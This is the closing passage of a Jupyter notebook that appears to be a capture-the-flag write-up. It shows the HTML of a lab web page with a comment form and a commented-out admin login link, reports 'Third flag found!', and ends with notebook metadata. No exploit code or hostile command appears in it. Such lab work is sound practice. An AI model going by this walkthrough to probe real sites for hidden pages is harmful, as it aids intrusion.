    "\t\t\t</body>\n",
    "</html>\n",
    "\t\t<br>\n",
    "\t\t<br>\n",
    "\t\t<hr>\n",
    "\t\t<h3>Comments</h3>\n",
    "\t\t<!--<a href=\"?page=admin.auth.inc\">Admin login</a>-->\n",
    "\t\t<h4>Add comment:</h4>\n",
    "\t\t<form method=\"POST\">\n",
    "\t\t\t<textarea rows=\"4\" cols=\"60\" name=\"body\"></textarea><br>\n",
    "\t\t\t<input type=\"submit\" value=\"Submit\">\n",
    "\t\t</form>\n",
    "\t</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Third flag found!"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "microlog",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
